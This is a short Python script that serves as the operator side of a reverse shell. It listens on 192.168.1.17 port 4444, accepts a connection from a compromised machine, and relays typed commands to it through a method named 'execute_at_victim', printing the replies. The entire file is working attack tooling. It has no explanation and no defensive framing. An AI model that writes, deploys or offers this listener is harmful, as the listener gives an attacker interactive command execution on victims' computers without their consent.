#!/usr/bin/env python
import socket
class Listener:
    def __init__(self, ip, p):
        l = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        l.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        l.bind((ip, p))
        l.listen(0)
        print("[.] Waiting for incoming Connections...")
        self.conn, self.ip_addr = l.accept()
        print("[+] Got a connection from " + str(self.ip_addr[0]) + " from port " + str(self.ip_addr[1]))

    def execute_at_victim(self, command):
        self.conn.send(command)
        return self.conn.recv(1024)

    def start(self):
        while True:
            command = raw_input(">>")
            output = self.execute_at_victim(command)
            print(str(output))


listen = Listener("192.168.1.17", 4444)
listen.start()
